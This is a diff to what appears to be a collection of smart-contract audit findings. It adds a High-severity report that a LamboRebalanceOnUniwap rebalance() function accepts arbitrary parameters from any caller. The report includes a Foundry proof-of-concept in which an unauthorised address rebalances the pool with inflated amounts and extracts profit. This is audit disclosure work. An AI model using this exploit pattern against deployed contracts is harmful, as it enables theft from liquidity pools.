@@ -6,7 +6,7 @@
     <th>tags</th>
   </tr>
   <tr>
-    <td>04. Pool</td>
+    <td>04. Pool</td>s
     <td>
       <table>
         <tr>
@@ -905,6 +905,115 @@ function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory) ext
             }
 +           ultiMintedPreviousCycle = ultiMintedForCycle[currentCycle - i - 1][user];
         }
+
+```
+
+</details>
+
+## 19.[High] Anyone can call LamboRebalanceOnUniwap.sol::rebalance() function with any arbitrary value, leading to rebalancing goal i.e. (1:1 peg) unsuccessful.
+
+### Rebalance 1:1 peg
+
+- Summary: The rebalance() function in the LamboRebalanceOnUniwap.sol contract can be called by anyone with arbitrary values for its parameters, such as directionMask, amountIn, and amountOut. Since there is no validation to check whether these parameters are legitimate or not, this leads to two potential problems. Flashloans may be executed with incorrect amounts, causing the pool to become unbalanced instead of achieving the intended 1:1 peg.
+  If the wrong directionMask is used (other than 0 or 1<<255), the function could revert or produce incorrect results.
+
+- Impact & Recommendation: To prevent this issue, the rebalance() function should validate that the parameters passed (such as directionMask, amountIn, and amountOut) are legitimate and meet the necessary conditions, such as those required for flashloan transactions. This validation will prevent unauthorized or incorrect rebalancing operations and ensure the pool's balance remains accurate.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-12-lambowin#h-04-anyone-can-call-lamborebalanceonuniwapsolrebalance-function-with-any-arbitrary-value-leading-to-rebalancing-goal-ie-11-peg-unsuccessful) & [Report](https://code4rena.com/reports/2024-12-lambowin)
+
+<details><summary>POC</summary>
+
+```solidity
+function test_any_caller() public {
+    uint256 amount = 422 ether;
+    uint256 _v3pool = uint256(uint160(uniswapPool)) | (_ONE_FOR_ZERO_MASK);
+    uint256[] memory pools = new uint256[](1);
+    pools[0] = _v3pool;
+
+    uint256 amountOut0 = IDexRouter(OKXRouter).uniswapV3SwapTo{value: amount}(
+        uint256(uint160(multiSign)),
+        amount,
+        0,
+        pools
+    );
+
+    console.log("user amountOut0", amountOut0);
+
+
+    (bool result, uint256 directionMask, uint256 amountIn, uint256 amountOut) = lamboRebalance.previewRebalance();
+    require(result, "Rebalance not profitable");
+
+    uint256 before_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
+    uint256 before_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);
+
+    uint snapshot = vm.snapshot();
+
+    lamboRebalance.rebalance(directionMask, amountIn, amountOut);
+
+    uint256 initialBalance = IERC20(WETH).balanceOf(address(this));
+    lamboRebalance.extractProfit(address(this), WETH);
+    uint256 finalBalance = IERC20(WETH).balanceOf(address(this));
+    require(finalBalance > initialBalance, "Profit must be greater than 0");
+
+    console.log("profit :", finalBalance - initialBalance);
+
+    uint256 after_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
+    uint256 after_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);
+
+
+    // profit : 2946145314758099343
+    // before_uniswapPoolWETHBalance:  872000000000000000000
+    // before_uniswapPoolVETHBalance:  33469956719686937289
+    // after_uniswapPoolWETHBalance:  449788833045085369301
+    // after_uniswapPoolVETHBalance:  452734978359843468645
+
+    console.log("before_uniswapPoolWETHBalance: ", before_uniswapPoolWETHBalance);
+    console.log("before_uniswapPoolVETHBalance: ", before_uniswapPoolVETHBalance);
+    console.log("after_uniswapPoolWETHBalance: ", after_uniswapPoolWETHBalance);
+    console.log("after_uniswapPoolVETHBalance: ", after_uniswapPoolVETHBalance);
+
+    vm.revertTo(snapshot);
+
+    // creating a non-authorised address.
+    uint256 signerPrivateKey = 0xabc123;
+    address signer = vm.addr(signerPrivateKey);
+
+    deal(WETH, signer, amountIn + 100 ether);
+    deal(VETH, signer, amountOut + 100 ether);
+
+    vm.startPrank(signer);
+    lamboRebalance.rebalance(directionMask, amountIn + 100 ether, amountOut + 100 ether);
+    vm.stopPrank();
+
+    initialBalance = IERC20(WETH).balanceOf(address(this));
+    lamboRebalance.extractProfit(address(this), WETH);
+    finalBalance = IERC20(WETH).balanceOf(address(this));
+    require(finalBalance > initialBalance, "Profit must be greater than 0");
+
+    console.log("profit :", finalBalance - initialBalance);
+
+    after_uniswapPoolWETHBalance = IERC20(WETH).balanceOf(uniswapPool);
+    after_uniswapPoolVETHBalance = IERC20(VETH).balanceOf(uniswapPool);
+
+    // profit : 2569562398577461702
+    // before_uniswapPoolWETHBalance:2  872000000000000000000
+    // before_uniswapPoolVETHBalance:2  33469956719686937289
+    // after_uniswapPoolWETHBalance:2  350165415961266006942
+    // after_uniswapPoolVETHBalance:2  552734978359843468645
+
+    console.log("before_uniswapPoolWETHBalance:2 ", before_uniswapPoolWETHBalance);
+    console.log("before_uniswapPoolVETHBalance:2 ", before_uniswapPoolVETHBalance);
+    console.log("after_uniswapPoolWETHBalance:2 ", after_uniswapPoolWETHBalance);
+    console.log("after_uniswapPoolVETHBalance:2 ", after_uniswapPoolVETHBalance);
+
+
+    require(
+        ((before_uniswapPoolWETHBalance + before_uniswapPoolVETHBalance) -
+            (after_uniswapPoolWETHBalance + after_uniswapPoolVETHBalance) ==
+            (finalBalance - initialBalance)),
+        "Rebalance Profit comes from pool's rebalance"
+    );
+
+}
 
 ```
 
